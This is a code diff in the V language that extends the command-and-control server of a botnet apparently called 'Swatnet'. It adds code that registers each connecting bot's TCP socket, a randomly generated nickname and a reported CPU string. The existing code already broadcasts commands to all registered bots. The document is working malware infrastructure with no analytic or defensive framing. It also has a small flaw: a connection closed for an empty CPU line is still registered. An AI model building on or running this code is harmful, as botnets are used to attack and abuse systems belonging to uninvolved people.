@@ -23,6 +23,12 @@ pub fn start_bot(mut b Bot_CNC, port string, mut s cnc.Swatnet)  {
 	b.listener(port, mut s)
 }
 
+pub fn (mut b Bot_CNC) add_bot_session(nick string, mut s net.TcpConn, cpu string) {
+	b.nickname << nick
+	b.socket << s
+	b.cpu << cpu
+}
+
 pub fn (mut b Bot_CNC) listener(port string, mut s cnc.Swatnet) {
 	mut socket := net.listen_tcp(.ip6, "${port}") or {
 		println("[x] Error, Unable to start bot system.....!")
@@ -49,7 +55,11 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, mut s cnc.Swatnet) {
 		return
 	}
 
-
+	cpu := reader.read_line() or { "" }
+	if cpu == "" {
+		bot_conn.close() or { return }
+	}
+	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu)
 }
 
 pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
@@ -70,4 +80,14 @@ pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
 		cmd = buff
 	}
 	return buff, cmd, args
+}
+
+pub fn (mut b Bot_CNC) randomize_nick() string {
+	chars := "q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,1,2,3,4,5,6,7,8,9,0".split(",")
+	mut random_nick := ""
+	for i in 0..chars.len {
+		random_num := rand.int_in_range(0, chars.len)
+		random_nick += chars[random_num]
+	}
+	return random_nick
 }
